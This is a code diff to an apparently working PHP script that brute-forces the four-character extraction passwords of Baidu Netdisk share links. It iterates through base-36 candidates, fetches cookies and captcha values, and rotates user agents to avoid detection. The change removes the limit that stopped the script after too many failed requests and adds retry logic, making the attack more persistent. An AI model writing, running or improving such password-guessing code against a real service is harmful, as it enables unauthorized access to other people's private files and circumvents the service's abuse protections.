@@ -15,11 +15,11 @@
 // 获取参数
 $data  = get_data();
 $surl  = get_arr($data, 'surl');      // 要破解的百度网盘资料的surl
-$start = intval(get_arr($data, 'start', 0));    // 从哪个数字开始验证密码
-$end   = intval(get_arr($data, 'end', 0));        // 验证到哪个密码
-$limit = intval(get_arr($data, 'limit', 0));      // 要破解的百度网盘资料的surl
-$sure  = intval(get_arr($data, 'sure', 0)); // 是否确认
-$error = intval(get_arr($data, 'error', -1)); //   总共有多少次请求失败就结束脚本
+$start = intval(get_arr($data, 'start'));    // 从哪个数字开始验证密码
+$end   = intval(get_arr($data, 'end'));        // 验证到哪个密码
+$limit = intval(get_arr($data, 'limit'));      // 要破解的百度网盘资料的surl
+$sure  = $data['sure']; // 是否确认
+//dump($data);die;
 
 if ( ! $surl)
 {
@@ -27,10 +27,9 @@ if ( ! $surl)
 NOTE需要传递参数 
 sure：是否确认
 surl：要破解的surl
-start：从哪个数字开始
-end：到哪个数字结束
-limit：从开始的数字起验证多少位，如果与end参数冲突，以end参数为准，默认为1000
-error：总共有多少次失败的请求后就结束脚本，默认为100次，最大为1000次
+start:从哪个数字开始
+end:到哪个数字结束
+limit: 从开始的数字起验证多少位，如果与end参数冲突，以end参数为准，默认为1000
 NOTE;
 
 	output($note);
@@ -38,11 +37,6 @@ NOTE;
 }
 
 set_time_limit(0);
-
-if ($error < 0 || $error > 1000)
-{
-	$error = 100;
-}
 
 if ($start < 0)
 {
@@ -71,15 +65,8 @@ $limit      = pow(36, 4);
 $user_agent = get_user_agent();
 $cookie_tmp = get_cookie($url, $user_agent);
 $vcode_str  = get_code($cookie_tmp);
-// i是验证码的计数，j 是每三次换一下user-agent，k是总共失败了多少次
-for ($i = $start, $j = 1, $k = 0; $i <= $end; $i ++, $j ++)
+for ($i = $start, $j = 1; $i < $end; $i ++, $j ++)
 {
-	if ($k > $error)
-	{
-		output('请求错误的次数已经超过上限：'.$k.' > '.$error);
-		die();
-		break;
-	}
 	if ($j % 4 == 0)
 	{
 		$j          = 1;
@@ -90,16 +77,20 @@ for ($i = $start, $j = 1, $k = 0; $i <= $end; $i ++, $j ++)
 	$str = get_str($i);
 	ll($h, $i.'---'.$str, FALSE);
 	$result = get_pan($url, $cookie_tmp, $user_agent, $str, $vcode_str, $h);
+
+	ll($h, $result, TRUE);
 	$result = json_decode(trim($result), TRUE);
 	$re     = FALSE;
 	if ( ! $result)
 	{
-		$k ++;
-		$j                    = 3;
 		$result['user-agent'] = $user_agent;
 	}
-	ll($h, $result, TRUE);
-	if ( ! is_array($result) || ! isset($result['errno']))
+	if ( ! is_array($result))
+	{
+		$i --;
+		$j ++;
+	}
+	if ( ! isset($result['errno']))
 	{
 		$result['errno'] = 9999;
 	}
